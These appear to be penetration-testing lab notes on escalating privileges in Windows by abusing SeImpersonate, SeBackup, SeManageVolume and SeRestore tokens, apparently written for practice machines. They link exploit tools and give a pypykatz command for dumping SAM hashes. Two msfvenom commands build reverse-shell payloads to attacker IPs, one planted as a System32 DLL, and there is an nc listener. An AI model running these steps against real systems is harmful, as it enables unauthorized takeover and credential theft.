# Privilege Abuse

{% embed url="https://github.com/gtworek/Priv2Admin" %}

## SeImpersonate

Potatoes from Windows PrivEsc

## SeBackup

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" %}

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}

```
pypykatz registry --sam sam system
```

## SeManageVolume

{% hint style="info" %}
Access \[PG AD]
{% endhint %}

{% embed url="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public" %}

{% embed url="https://sirensecurity.io/blog/dllref/" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.62 LPORT=135 -f dll -o tzres.dll
C:\Windows\System32\wbem\tzres.dll [folder]

Open listener on kali and run on Windows
systeminfo
```

## SeRestoreAbuse

{% hint style="info" %}
Vault \[PG AD]
{% endhint %}

{% embed url="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" %}

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80`

`.\SeRestoreAbuse.exe C:\Temp\reverse.exe [Absolute path]`

`nc -lvnp 80`
